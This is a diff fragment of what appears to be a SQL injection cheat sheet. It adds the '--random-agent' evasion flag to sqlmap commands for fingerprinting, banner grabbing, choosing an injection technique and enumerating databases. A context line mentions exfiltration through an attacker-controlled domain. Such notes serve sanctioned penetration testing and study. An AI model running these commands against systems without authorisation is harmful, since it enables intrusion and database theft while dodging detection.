@@ -168,10 +168,10 @@ When the database queries the attacker’s controlled domain, information (like 
 > sqlmap -u "<url>"
 > ```
 > ```
-> sqlmap -u "<url>" --fingerprint
+> sqlmap -u "<url>" --fingerprint --random-agent
 > ```
 >```
-> sqlmap -u "<url>" --threads=3 --banner
+> sqlmap -u "<url>" --threads=3 --banner --random-agent
 > ```
 > Error Base 
 > ```
@@ -180,17 +180,17 @@ When the database queries the attacker’s controlled domain, information (like 
 > -- Stacked Queries
 > -- Time Based (Blind)
 > -- Inline Queries
-> sqlmap -r request.txt -p inputvartoFUZZ --technique=BUSTEQ..
+> sqlmap -r request.txt -p inputvartoFUZZ --random-agent --technique=BUSTEQ..
 >```
 >```
->sqlmap -r request.txt -p inputvartoFUZZ
+>sqlmap -r request.txt -p inputvartoFUZZ --random-agent
 >```
 > Found DBS
 > ```
->sqlmap -r request.txt -p inputvartoFUZZ --dbs --batch
+>sqlmap -r request.txt -p inputvartoFUZZ --dbs --batch --random-agent
 > ```
 > ```
->sqlmap -r request.txt -p inputvartoFUZZ --technique=E --current-db
+>sqlmap -r request.txt -p inputvartoFUZZ --random-agent --technique=E --current-db
 > ```
 > Extract Tables From Database
 > ```
